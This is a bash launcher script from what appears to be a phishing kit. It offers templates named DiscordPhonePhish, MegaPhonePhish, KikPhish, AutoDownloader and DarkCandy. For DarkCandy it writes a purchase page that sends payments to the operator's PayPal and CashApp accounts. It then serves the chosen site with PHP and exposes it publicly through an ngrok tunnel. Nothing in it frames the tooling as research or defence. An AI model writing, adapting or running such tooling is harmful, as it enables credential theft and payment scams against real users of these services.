#!/bin/bash

echo "Which website do you want to use?"
echo "1: AutoDownloader"
echo "2: DarkCandy"
echo "3: DiscordPhonePhish"
echo "4: MegaPhonePhish"
echo "5: KikPhish"
read -p "Enter the number of your choice: " choice

# Set the folder based on the user selection
case $choice in
    1) folder="AutoDownloader" ;;
    2) folder="DarkCandy" ;;
    3) folder="DiscordPhonePhish" ;;
    4) folder="MegaPhonePhish" ;;
    5) folder="KikPhish" ;;
    *) echo "Invalid choice. Exiting."; exit 1 ;;
esac

# Change directory to the selected folder
cd "$(dirname "$0")/$folder" || { echo "Failed to change directory. Exiting."; exit 1; }

# If DarkCandy is selected, ask for PayPal and CashApp usernames
if [ "$choice" == "2" ]; then
    read -p "What is your PayPal username (without https://paypal.me/)? " paypalUsername
    read -p "What is your CashApp cashtag (without $)? " cashAppUsername

    echo "Updating purchase.html with your PayPal and CashApp info..."

    # Create the new purchase.html content with user inputs
    cat <<EOF > purchase.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Purchase</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Purchase</h1>
        <nav>
            <ul>
                <li><a href="index.html">Home</a></li>
                <li><a href="login.html">Login</a></li>
                <li><a href="purchase.html">Purchase</a></li>
            </ul>
        </nav>
    </header>
    <main>
        <h2>Choose Your Payment Method</h2>
        <div class="payment-option">
            <h3>Pay with PayPal</h3>
            <p>Send your payment to <strong><a href="https://paypal.me/$paypalUsername" target="_blank">paypal.me/$paypalUsername</a></strong>.</p>
            <a href="https://paypal.me/$paypalUsername" target="_blank"><button class="payment-button">Pay with PayPal</button></a>
        </div>
        <div class="payment-option">
            <h3>Pay with CashApp</h3>
            <p>Send your payment to <strong>\$$cashAppUsername</strong> on CashApp.</p>
            <a href="https://cash.app/\$$cashAppUsername" target="_blank"><button class="payment-button">Pay with CashApp</button></a>
        </div>
    </main>
    <footer>
        <p>&copy; 2024 Your Website</p>
    </footer>
</body>
</html>
EOF

    echo "purchase.html has been updated with your PayPal and CashApp info."
fi

# Start PHP server in the background
php -S localhost:8000 &

# Start Ngrok in the background
ngrok http 8000 &

# Wait for user input to keep the script running
read -p "Servers are running. Press [Enter] to stop them and exit."

# Kill background processes (PHP and Ngrok)
kill $(jobs -p)
